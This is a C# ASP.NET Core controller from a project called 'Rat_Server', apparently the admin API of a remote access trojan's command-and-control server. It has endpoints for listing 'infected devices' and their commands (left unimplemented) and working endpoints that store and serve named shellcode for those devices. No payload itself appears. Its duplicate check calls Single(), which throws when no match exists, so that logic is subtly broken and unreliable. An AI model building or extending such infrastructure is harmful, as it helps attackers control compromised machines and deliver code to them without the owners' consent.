using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using Org.BouncyCastle.Utilities;
using Rat_Server.Model.Context;
using Rat_Server.Model.DTOs;
using Rat_Server.Model.Entities;
using System.Net;

namespace Rat_Server.Controllers
{
    /// <summary>
    /// This controller contains endpoints that perform 
    /// administrative actions on the infected devices.
    /// </summary>
    [Authorize(Policy = "AdminOnly")]
    [Route("api/[controller]")]
    [ApiController]
    public class AdminController : ControllerBase
    {
        private readonly RatDbContext _context;

        public AdminController(RatDbContext context)
        {
            _context = context;
        }

        [HttpGet("GetAllInfectedDevices")]
        public ActionResult<List<DeviceCommandDto>> GetAllInfectedDevices()
        {
            return StatusCode(StatusCodes.Status501NotImplemented);
        }

        [HttpGet("GetDeviceCommands/{deviceId}")]
        public ActionResult<List<DeviceCommandDto>> GetDeviceCommands(int deviceId)
        {
            return StatusCode(StatusCodes.Status501NotImplemented);
        }

        [HttpPost("AddShellCode")]
        [ProducesResponseType(StatusCodes.Status201Created)]
        [ProducesResponseType(StatusCodes.Status409Conflict)]
        public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
        {
            if(_context.ShellCodes.Single(b => b.Name == shellCodeDto.Name) != null)
            {
                return StatusCode(StatusCodes.Status409Conflict);
            }

            await _context.ShellCodes.AddAsync(new ShellCode
            {
                Name = shellCodeDto.Name,
                Code = shellCodeDto.Code
            });

            await _context.SaveChangesAsync();

            return StatusCode(StatusCodes.Status201Created);
        }

        [HttpGet("GetAllShellCode")]
        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
        {
            return await _context.ShellCodes.Select(b => new ShellCodeDto
            {
                Name = b.Name,
                Code = b.Code
            }).ToListAsync();
        }
    }
}
